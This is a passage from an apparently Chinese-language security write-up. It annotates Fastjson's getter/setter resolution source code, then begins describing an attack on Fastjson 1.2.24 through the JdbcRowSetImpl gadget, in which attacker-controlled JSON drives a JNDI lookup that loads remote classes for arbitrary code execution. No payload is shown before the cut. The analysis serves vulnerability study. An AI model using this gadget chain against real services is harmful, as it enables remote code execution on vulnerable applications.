class="comment">//@JSONField 注解的一些内容</span></span><br><span class="line">            <span class="type">JSONField</span> <span class="variable">fieldAnnotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                fieldAnnotation = field.getAnnotation(JSONField.class);</span><br><span class="line">				<span class="comment">//注解配置了是否序列化 eg:@JSONField(deserialize = false)</span></span><br><span class="line">                <span class="keyword">if</span> (fieldAnnotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!fieldAnnotation.deserialize()) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 注解配置名有name就会进行序列化 @JSONField(name = &quot;product_id&quot;, ordinal = 1) </span></span><br><span class="line">                    ordinal = fieldAnnotation.ordinal();</span><br><span class="line">                    serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                    parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                        propertyName = fieldAnnotation.name();</span><br><span class="line">                        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal,</span><br><span class="line">                                                     serialzeFeatures, parserFeatures, annotation, fieldAnnotation, <span class="literal">null</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//添加到列表</span></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                         annotation, fieldAnnotation, <span class="literal">null</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Getter-isXxxx"><a href="#Getter-isXxxx" class="headerlink" title="Getter()&#x2F;isXxxx()"></a>Getter()&#x2F;isXxxx()</h3><ul>
<li><p>TypeUtils的computeGetters方法</p>
</li>
<li><p>在Getter方法的遍历中会将所有的Getter方法进行调用，即使没有设置值，同样也会调用。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : clazz.getMethods()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> <span class="number">0</span>, serialzeFeatures = <span class="number">0</span>, parserFeatures = <span class="number">0</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">label</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">			<span class="comment">//不能是静态方法</span></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//返回类型不能为void</span></span><br><span class="line">            <span class="keyword">if</span> (method.getReturnType().equals(Void.TYPE)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//不能有参数</span></span><br><span class="line">            <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//返回值类型不能是类加载器</span></span><br><span class="line">            <span class="keyword">if</span> (method.getReturnType() == ClassLoader.class) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//排除Groovy特有的getMetaClass方法，避免在Java环境中处理Groovy元编程（Meta-Programming）相关的逻辑</span></span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getMetaClass&quot;</span>)</span><br><span class="line">                &amp;&amp; method.getReturnType().getName().equals(<span class="string">&quot;groovy.lang.MetaClass&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (annotation == <span class="literal">null</span>) &#123;</span><br><span class="line">                annotation = getSuperMethodAnnotation(clazz, method);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//注解配置了是否序列化 eg:@JSONField(deserialize = false)</span></span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!annotation.serialize()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ordinal = annotation.ordinal();</span><br><span class="line">                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">                parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line">				<span class="comment">// 注解配置名有name就会进行序列化 @JSONField(name = &quot;product_id&quot;, ordinal = 1) </span></span><br><span class="line">                <span class="keyword">if</span> (annotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> annotation.name();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (aliasMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                        propertyName = aliasMap.get(propertyName);</span><br><span class="line">                        <span class="keyword">if</span> (propertyName == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, <span class="literal">null</span>, ordinal,</span><br><span class="line">                                                        serialzeFeatures, parserFeatures, annotation, <span class="literal">null</span>, label);</span><br><span class="line">                    fieldInfoMap.put(propertyName, fieldInfo);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (annotation.label().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                    label = annotation.label();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">//方法名至少4个字母getX</span></span><br><span class="line">                <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="comment">//方法名不能为getClass</span></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;getClass&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="comment">//方法名不能是getDeclaringClass并且是枚举类型</span></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;getDeclaringClass&quot;</span>) &amp;&amp; clazz.isEnum()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> methodName.charAt(<span class="number">3</span>);</span><br><span class="line">				</span><br><span class="line">                <span class="comment">//判断第四个字符不能为特殊字母</span></span><br><span class="line">                String propertyName;</span><br><span class="line">                <span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">                    || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">                ) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (compatibleWithJavaBean) &#123;</span><br><span class="line">                        propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    propertyName = getPropertyNameByCompatibleFieldName(fieldCacheMap, methodName,  propertyName,<span class="number">3</span>); </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">                    propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">				</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">ignore</span> <span class="operator">=</span> isJSONTypeIgnore(clazz, propertyName);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (ignore) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//假如bean的field很多的情况一下，轮询时将大大降低效率</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; propertyName.length() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">javaBeanCompatiblePropertyName</span> <span class="operator">=</span> decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">                        field = ParserConfig.getFieldFromCache(javaBeanCompatiblePropertyName, fieldCacheMap);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//字段名注解判断，和上面一样</span></span><br><span class="line">                <span class="type">JSONField</span> <span class="variable">fieldAnnotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    fieldAnnotation = field.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!fieldAnnotation.serialize()) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        ordinal = fieldAnnotation.ordinal();</span><br><span class="line">                        serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                        parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                            propertyName = fieldAnnotation.name();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (aliasMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                                propertyName = aliasMap.get(propertyName);</span><br><span class="line">                                <span class="keyword">if</span> (propertyName == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (fieldAnnotation.label().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                            label = fieldAnnotation.label();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="comment">//属性名不能为空，目前看来并不算判断常规方法的是否有这个属性</span></span><br><span class="line">                <span class="keyword">if</span> (aliasMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = aliasMap.get(propertyName);</span><br><span class="line">                    <span class="keyword">if</span> (propertyName == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, <span class="literal">null</span>, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                                    annotation, fieldAnnotation, label);</span><br><span class="line">                fieldInfoMap.put(propertyName, fieldInfo);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//isXxxx方法，长度不能小于3</span></span><br><span class="line">            <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;is&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (methodName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="comment">//返回类型只能是boolean或者Boolean.class</span></span><br><span class="line">                <span class="keyword">if</span> (method.getReturnType() != Boolean.TYPE</span><br><span class="line">                        &amp;&amp; method.getReturnType() != Boolean.class) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> methodName.charAt(<span class="number">2</span>);</span><br><span class="line">				<span class="comment">//第三个字符不能是特殊字符</span></span><br><span class="line">                String propertyName;</span><br><span class="line">                <span class="keyword">if</span> (Character.isUpperCase(c2)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (compatibleWithJavaBean) &#123;</span><br><span class="line">                        propertyName = decapitalize(methodName.substring(<span class="number">2</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">2</span>)) + methodName.substring(<span class="number">3</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    propertyName = getPropertyNameByCompatibleFieldName(fieldCacheMap, methodName,  propertyName,<span class="number">2</span>); </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c2 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c2 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ParserConfig.getFieldFromCache(propertyName,fieldCacheMap);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">                    field = ParserConfig.getFieldFromCache(methodName,fieldCacheMap); </span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">JSONField</span> <span class="variable">fieldAnnotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    fieldAnnotation = field.getAnnotation(JSONField.class);</span><br><span class="line">					<span class="comment">//isXxx方法注解判断</span></span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!fieldAnnotation.serialize()) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        ordinal = fieldAnnotation.ordinal();</span><br><span class="line">                        serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                        parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                            propertyName = fieldAnnotation.name();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (aliasMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                                propertyName = aliasMap.get(propertyName);</span><br><span class="line">                                <span class="keyword">if</span> (propertyName == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (fieldAnnotation.label().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                            label = fieldAnnotation.label();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="comment">//属性名不能为空，目前看来并不算判断常规方法的是否有这个属性</span></span><br><span class="line">                <span class="keyword">if</span> (aliasMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = aliasMap.get(propertyName);</span><br><span class="line">                    <span class="keyword">if</span> (propertyName == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//优先选择get,如果已经包含过了就不添加了</span></span><br><span class="line">                <span class="keyword">if</span> (fieldInfoMap.containsKey(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, <span class="literal">null</span>, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                                    annotation, fieldAnnotation, label);</span><br><span class="line">                fieldInfoMap.put(propertyName, fieldInfo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在JavaBeanSerializer中遍历执行所有添加到fieldInfoMap中的Getter和isXxx方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">           map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> map;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="1-5-注意事项"><a href="#1-5-注意事项" class="headerlink" title="1.5.注意事项"></a>1.5.注意事项</h2><ol>
<li>setter 只会根据方法名来对属性的值进行注入，和属性的名无关。<ul>
<li>想要对Name进行字段设置和setUsername进行方法调用，只需要传输这样的json串{“username”:”admin”}&#x2F;&#x2F;大小写都可以,而不是{“name”,”admin”}，也就是说方法调用只跟方法名有关，和属性名无关，而且不区分大小写。</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>parseObject方法的<strong>执行顺序</strong>，先执行parse，调用set方法，set方法执行顺序是按JSON字符串从前到后的顺序来的。再调用toJSON调用get&#x2F;is方法，是按方法的第四&#x2F;三个字母的ASCII码的顺序进行执行。</li>
<li>在toJSON中默认会遍历执行所有的Getter方法，即使没有为其赋值。</li>
<li>想要进入底层类调试需要配置一个getMap,也就是返回值为Map的get方法，避免其代码逻辑进入临时生成的类的逻辑，从而无法调试。</li>
</ol>
<h1 id="2-打V1-2-24"><a href="#2-打V1-2-24" class="headerlink" title="2.打V1.2.24"></a>2.打V1.2.24</h1><h2 id="2-1-JdbcRowSetImpl"><a href="#2-1-JdbcRowSetImpl" class="headerlink" title="2.1.JdbcRowSetImpl"></a>2.1.JdbcRowSetImpl</h2><h3 id="2-1-1类分析"><a href="#2-1-1类分析" class="headerlink" title="2.1.1类分析"></a>2.1.1类分析</h3><p>在jdk中有这样一个类.</p>
<ul>
<li><p><code>JdbcRowSetImpl</code> 是 Java 中一个 <strong>内置的 JDBC 扩展类</strong>，属于 <code>javax.sql.rowset</code> 包的一部分。它的核心作用是提供一种 <strong>断开连接（disconnected）的 <code>RowSet</code> 实现</strong>，允许开发者以更灵活的方式操作数据库数据</p>
</li>
<li><p>而在该类中存在一个我们非常感兴趣的方法，lookup函数，这个我相信大家都不陌生了，在之间的<strong>JDNI(rmi&#x2F;ldap)<strong>注入分析我们利用</strong>InitialContext</strong>的<strong>lookup</strong>函数参数的注入，链接远程<strong>Reference</strong>链接远程工厂类，实现类加载执行任意代码。</p>
</li>
<li><p>所以我们看到lookup函数就应该兴奋起来，看该方法是否可以调用，参数是否可以控制。</p>
</li>
<li><p>我们先查看lookup函数的参数是否可控，lookup函数的参数getDataSourceName()，从这个方法中传入，因此我们可以思考是否可以通过JSON反序列化控制getDataSourceName()的返回值。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 